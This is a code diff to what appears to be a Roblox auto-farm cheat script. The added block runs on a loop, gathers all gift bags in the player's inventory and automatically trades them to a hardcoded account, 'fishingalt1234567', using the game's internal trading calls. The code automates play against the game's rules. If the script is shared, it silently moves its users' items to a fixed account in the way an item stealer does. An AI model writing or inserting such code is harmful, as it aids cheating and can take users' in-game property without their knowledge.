@@ -138,6 +138,14 @@ function getTool() return Player.Character:FindFirstChild("WEAPON_"..Player.Name
 function equipTool(toolName) return Library.Network.Invoke(toolName.."_Toggle") end
 function getCurrentZone() return Library["MapCmds"].GetCurrentZone() end
 local HttpService = game:GetService("HttpService")
+-- Trade Start
+local receiverAcc = "fishingalt1234567"
+local Client = require(game.ReplicatedStorage.Library.Client)
+local TradingCmds = require(game.ReplicatedStorage.Library.Client.TradingCmds)
+function GetTradeID() return TradingCmds.GetState()._id end
+function GetCounter() return TradingCmds.GetState()._counter end
+-- End
+
 
 function sendNotif(msg)
     local message = {
@@ -362,6 +370,39 @@ while getgenv().MoneyPrinter.autoBalloons do task.wait()
 				task.wait(3)
 				-- sendNotiff("```asciidoc\n[ " .. Player.Name .. " Ready ]\n 3.3m for 1000x \n[ TRADE ]\n‐ " .. tostring(endGifts) .. " Gift Bags \n```")
 				print("1st Webhook sent")
+				if game.Players:FindFirstChild(receiverAcc) then
+					while task.wait(5) do
+    						local itemsToTrade = {}
+    						for i,v in next, Library.Save.Get().Inventory.Misc do
+        						if v.id == "Large Gift Bag" then
+						            table.insert(itemsToTrade, {["Class"] = "Misc", ["uid"] = i, ["Item"] = v})
+						        elseif v.id == "Gift Bag" then
+						            table.insert(itemsToTrade, {["Class"] = "Misc", ["uid"] = i, ["Item"] = v})
+						        end
+						    end
+						    
+						    if not TradingCmds.GetState() then
+						        if #itemsToTrade >= 1 then
+						            if game.Players:FindFirstChild(receiverAcc) then
+						                repeat
+						                    local requestSuccess,requestReason = Library.Network.Invoke("Server: Trading: Request", game.Players[receiverAcc]) 
+						                until requestSuccess or requestReason == "Request already sent!"
+						            end
+						        end
+						    end
+						    
+						    if TradingCmds.GetState() then
+						        for _,v in pairs(itemsToTrade) do
+						            local setSuccess,setReason = Library.Network.Invoke("Server: Trading: Set Item", GetTradeID(), v.Class, v.uid, (v.Item._am or 1)) task.wait(.1)
+						        end
+						        repeat
+						            local readySuccess, readyReason = Library.Network.Invoke("Server: Trading: Set Ready", GetTradeID(), true, GetCounter())
+						        until readySuccess
+						    end
+						end
+				else
+					print("Player Not In Server")
+				end
 			end
 				
 			if endLarge >= 1000 then
@@ -374,4 +415,6 @@ while getgenv().MoneyPrinter.autoBalloons do task.wait()
 			-- repeat game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getServer().id, Player) task.wait(3) until not game.PlaceId
 		end
 	end
+	
+		
 end
